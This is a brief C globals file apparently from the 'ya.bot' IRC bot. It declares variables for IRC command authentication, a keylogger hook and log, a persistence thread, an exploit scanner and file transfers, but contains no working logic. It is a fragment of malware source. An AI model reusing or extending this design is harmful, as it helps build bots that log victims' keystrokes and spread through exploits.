/*  ya.bot  */

#include "bot.h"

//irc.cpp
	char g_szBotNick[32];
//irc_parser.cpp
	bool g_bAuthed = FALSE;
	char g_szAuthedHost[LOWBUF];
//bot.cpp
	SERVICE_STATUS g_ssService;
	SERVICE_STATUS_HANDLE g_sshService;
//keylog.cpp
#ifndef NO_KEYLOG
	bool g_bSignature = FALSE;
	char g_szLog[IRCBUF];
	HHOOK g_hHook = NULL;
	HWND g_hLastFocus = NULL;
#endif
//persist.cpp
#ifndef NO_PERSIST
	HANDLE g_hPersistThread = NULL;
#endif
//thread.cpp
	SThread g_threads[THREAD_MAX];
//userctrl.cpp
	SAuthedUsers *g_authedusers = NULL;
	SUserList *g_userlist = NULL;
//expscan.cpp
#ifndef NO_EXPSCAN
	char g_szScanning[LOWBUF];
#endif
//transfer.cpp
	int g_nTransfers = 0;